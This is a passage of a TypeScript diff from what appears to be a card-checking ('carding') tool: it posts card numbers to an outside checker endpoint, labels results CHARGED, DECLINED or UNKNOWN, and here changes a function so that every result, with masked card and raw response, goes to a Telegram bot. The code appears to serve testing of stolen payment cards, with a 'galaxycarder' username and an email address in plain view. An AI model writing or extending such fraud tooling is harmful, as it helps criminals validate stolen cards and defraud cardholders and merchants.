@@ -15,14 +15,19 @@ const API_URL = "https://ig-production-e72e.up.railway.app/api/check";
 const API_EMAIL = "losthack11@gmail.com";
 const API_USERNAME = "galaxycarder";
 
-// Send admin debug notification for UNKNOWN results only
+// Send admin debug notification for ALL results (CHARGED, DEAD, UNKNOWN)
 async function sendAdminDebug(card: string, rawResponse: string, status: string) {
-  if (!TELEGRAM_BOT_TOKEN || status !== "unknown") return;
+  if (!TELEGRAM_BOT_TOKEN) return;
   
   const maskedCard = card.replace(/^(\d{6})(\d+)(\d{4})/, '$1****$3');
-  const message = `🔧 [RIZZUP DEBUG] ${status.toUpperCase()}
-Card: ${maskedCard}
-Response: ${rawResponse.slice(0, 500)}`;
+  const statusEmoji = status === "live" ? "✅" : status === "dead" ? "❌" : "⚠️";
+  const statusLabel = status === "live" ? "CHARGED" : status === "dead" ? "DECLINED" : "UNKNOWN";
+  
+  const message = `🔧 <b>[RIZZUP DEBUG]</b> ${statusEmoji} ${statusLabel}
+
+💳 Card: <code>${maskedCard}</code>
+📡 Raw Response:
+<code>${rawResponse.slice(0, 800)}</code>`;
 
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
